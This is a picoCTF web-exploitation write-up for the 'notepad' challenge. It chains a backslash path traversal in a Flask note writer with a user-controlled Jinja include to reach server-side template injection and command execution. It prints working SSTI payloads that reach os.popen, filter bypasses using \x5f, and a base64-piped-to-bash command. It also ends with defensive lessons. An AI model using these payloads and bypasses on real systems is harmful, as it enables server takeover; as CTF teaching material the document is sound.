# notepad

**picoCTF — Web Exploitation**

> **TL;DR:** The app lets us *write* a file (into `static/`) and separately *include* a
> template whose path we control (`?error=`). Neither is fatal alone. Chained together —
> using a path-traversal trick to plant our file where the include will find it — they give
> full **Server-Side Template Injection (SSTI) → RCE → flag**.

## RECON

This challenge gives you a web app that:
* receives `content` from the user
* writes it as an HTML file in the `static/` directory, then redirects to that file

<img width="337" height="172" alt="image" src="https://github.com/user-attachments/assets/ee8af4b9-c51a-4fec-ae6d-89c70bc26fc0" />

<img width="562" height="117" alt="image" src="https://github.com/user-attachments/assets/25e75dd6-bb27-489a-b780-a0794d516a9a" />

Source code, `app.py`:

```python
from werkzeug.urls import url_fix
from secrets import token_urlsafe
from flask import Flask, request, render_template, redirect, url_for

app = Flask(__name__)

@app.route("/")
def index():
    return render_template("index.html", error=request.args.get("error"))

@app.route("/new", methods=["POST"])
def create():
    content = request.form.get("content", "")
    if "_" in content or "/" in content:
        return redirect(url_for("index", error="bad_content"))
    if len(content) > 512:
        return redirect(url_for("index", error="long_content", len=len(content)))
    name = f"static/{url_fix(content[:128])}-{token_urlsafe(8)}.html"
    with open(name, "w") as f:
        f.write(content)
    return redirect(name)
```

What this code does:

The app receives `content` from user input:
```python
content = request.form.get("content", "")
```

It **rejects the whole input** (redirects to an error page) if the input contains `_` or `/`.
Note: it does not strip these characters — a single `_` or `/` anywhere throws the request away:
```python
if "_" in content or "/" in content:
    return redirect(url_for("index", error="bad_content"))
```

If the input is longer than 512 characters it redirects with `error="long_content"`:
```python
if len(content) > 512:
    return redirect(url_for("index", error="long_content", len=len(content)))
```

Otherwise it builds a filename, writes the file, and redirects to it. `url_fix` takes the
first 128 characters, normalizes them into a valid URL, and the name ends with 8 random
characters from `token_urlsafe`:

```python
name = f"static/{url_fix(content[:128])}-{token_urlsafe(8)}.html"
```

> **Key note 1:** `url_fix` converts `\` (backslash) into `/`.
> **Key note 2:** `url_fix` only touches `content[:128]` (the *filename*). The file **body** is
> written raw via `f.write(content)` — it is never normalized. This distinction matters later.

This is `index.html`:

<img width="650" height="301" alt="image" src="https://github.com/user-attachments/assets/1a4fa4f5-4cb2-4982-93fb-6ac71911c8a8" />

`error` is used in two places, and they are not equally safe:

* `{{ error }}` — printed as text. Jinja auto-escapes HTML here, so there is nothing we can do with it.
* `{% include "errors/" + error + ".html" ignore missing %}` — `error` is concatenated
  **into the path of a template that gets included and rendered**. This is the real bug:
  we control *which template file* gets rendered. if it has jinja file it will run as well

We need to make our own input become an included template. So:

## PLAN

1. Find a way to make a file we control appear where the `include` will load it.
2. Craft a payload that bypasses the `_` and `/` filter, and push it past the first 128
   characters (so it lands in the file body, not in the filename).

## TEST — make our file appear via the error page

First payload:
```
..\templates\errors\test
```

<img width="553" height="263" alt="image" src="https://github.com/user-attachments/assets/8d7dbe3a-e62b-4aa9-98c4-61af96ad05d0" />

Following the code:
```python
name = f"static/{url_fix(content[:128])}-{token_urlsafe(8)}.html"
```

`url_fix` turns the backslashes into forward slashes, so the filename becomes:
```
static/../templates/errors/test-<token>.html
```

Which resolves on disk to:
```
/app/templates/errors/test-<token>.html
```

That means our file now lives inside `templates/errors/` as `test-<token>.html` — exactly
where `{% include "errors/" + error + ".html" %}` looks. `..` worked in the *filename*
because Python's `open()` follows `../` at the OS level with no restriction.

### Getting the random token

The filename ends in a random `token_urlsafe(8)`, so how do we know it? The app calls
`redirect(name)` after writing, so the **`Location` header of the redirect leaks the full
filename, including the token**. Opening that URL directly 404s (the real file sits under
`templates/`, not `static/`), but we only need to read the token out of the header, then use
it as `?error=test-<token>`.

### Why traverse at write time instead of at include time?

A fair question: the `_`/`/` filter only applies to `content`, not to the `error` GET
parameter — so why not leave the note in `static/` and point the include at it with
`?error=..\..\static\note-<token>`?

Because **Jinja's template loader blocks `..`**. Its `split_template_path` raises
`TemplateNotFound` the moment it sees `..` in a path. So we can never traverse *out* of
`templates/` at include time. The asymmetry is the crux of the challenge:

| Stage | Mechanism | Allows `..`? |
| --- | --- | --- |
| Writing the file (`open()`) | OS-level file open | **Yes** |
| Including the file (`{% include %}`) | Jinja loader | **No** — rejects `..` |

So we must do the traversal while **writing** (land the file inside `templates/errors/`),
then reference it at include time with a clean, `..`-free path.

### Pushing the payload past 128 characters

We want the SSTI to be in the file *body*, not the filename. If `{{ }}` lands in the first
128 chars, `url_fix` percent-encodes `{`/`}` and mangles the filename (the body still executes,
but the name becomes hard to reference). So we pad the traversal with extra `..\` until the
payload starts after byte 128:

```
..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\app\templates\errors\test{{7*7}}
```

<img width="838" height="287" alt="image" src="https://github.com/user-attachments/assets/52d01b5a-7ea7-4982-b352-c599f5a9a6cf" />

It renders `49` — SSTI confirmed.

## Crafting the payload

Before any bypass, the command we actually want is:

```
{{ request["application"]["__globals__"]["__builtins__"]["__import__"]("os")["popen"]("ls /app")["read"]() }}
```

What it means:

* `{{ ... }}` in Jinja evaluates everything inside and prints the output.
* `request` — the Flask request object, handed to every template automatically. Our entry point.
* `["application"]` — the Flask app object. It's function-like, so it carries `__globals__`.
* `["__globals__"]` — the module's global namespace (a dict).
* `["__builtins__"]["__import__"]` — reach Python's built-ins and grab `__import__`, the
  function behind the `import` keyword.
* `("os")` — import the `os` module.
* `["popen"]("ls /app")["read"]()` — run a shell command and read its output back as a string.

In plain Python this is just:
```python
import os
print(os.popen("ls /app").read())
```

We only climb this chain because SSTI can't call `import` directly — it can only reach objects
the template exposes (`request`) and walk from there into the runtime via dunder attributes.

## Bypassing the filter

The clean payload above trips the filter twice: it's full of `_`, and `ls /app` contains `/`.
Two bypasses:

**Underscore `_` → `\x5f`.** In a Jinja string, `\x5f` is read back as `_`, but as typed in our
note it's the characters `\ x 5 f`, so it passes the filter. `"\x5f\x5fglobals\x5f\x5f"` becomes
`__globals__`. (We switch from `.attr` to `["attr"]` access precisely so we can feed in these
crafted strings.)

**Slash `/` in the command → base64.** We can't write `ls /app` (has `/`), and note that the
`\`→`/` trick does **not** help here: `url_fix` only rewrites the filename portion, while the
shell command lives in the file *body* and is written raw. So we base64-encode the command
instead:

```
ls /app  →  bHMgL2FwcA==
```

and run:
```
echo -n bHMgL2FwcA== | base64 -d | bash
```

* `echo -n bHMgL2FwcA==` — print the encoded string (`-n` = no trailing newline).
* `| base64 -d` — decode it back to `ls /app`.
* `| bash` — execute the decoded command.

> **Watch out:** the base64 alphabet itself includes `/`. `bHMgL2FwcA==` happens to contain no
> `/`, so we got lucky. If an encoded command *does* contain a `/`, use URL-safe base64
> (`base64 -w0` + `tr '+/' '-_'`, decoded with `base64 --decode` after reversing) or another
> encoding.

## Final payload

```
..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\app\templates\errors\test {{ request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n bHMgL2FwcA== | base64 -d | bash")["read"]() }}
```

Submit it, read the token from the redirect, then visit `?error=test-<token>`:

<img width="1391" height="281" alt="image" src="https://github.com/user-attachments/assets/48b0c59f-9382-456b-8c7c-4d2038cf3da1" />

`ls /app` lists a randomly-named flag file. Then we swap the command to read it:

<img width="1263" height="250" alt="image" src="https://github.com/user-attachments/assets/35e82cc8-d243-49ba-983f-d171224f28ea" />

> **Note:** the flag filename `flag-c8f5526c-4122-4578-96de-d7dd27193798.txt` has no `_` and no
> `/`, and the process runs from `/app` already, so the final read doesn't actually need base64
> at all — `popen("cat flag-c8f5526c-....txt")` would pass the filter directly. Keeping it inside
> the same `echo | base64 -d | bash` wrapper is fine too; it just isn't required here.

## Lessons / patterns worth remembering

1. **Same input, different context, different risk.** `{{ error }}` is safe; the same `error`
   inside `{% include %}` is a template-path injection. When auditing, trace every place an
   input flows to.
2. **Combine two weak primitives.** "Write a file somewhere" + "include a file by name" = full
   SSTI. Hard challenges usually chain small primitives rather than hand you one big bug.
3. **Blocklists miss equivalents.** `/` blocked but `\` allowed; `_` blocked but `\x5f` allowed;
   space blocked but `${IFS}` allowed. Always ask "what else produces the same result?"
4. **Watch normalizers that run *after* the filter.** `url_fix` rewrites `\`→`/` after the check
   has already passed — same class as double URL-decode or unicode normalization.
5. **Path-traversal defenses live at different layers.** Python's `open()` allows `..`; Jinja's
   loader blocks it. The bug lives at the seam where the looser layer (write) meets the stricter
   one (include).
6. **A random token isn't a secret if the app leaks it.** `token_urlsafe(8)` looks unguessable,
   but the redirect hands it right back.

## Fix (for defenders)

* Never concatenate user input into an `{% include %}` / `{% extends %}` path — use an allowlist
  of permitted template names.
* Don't rely on a character blocklist as the primary defense; keep user-writable upload
  directories completely outside the template engine's search path.
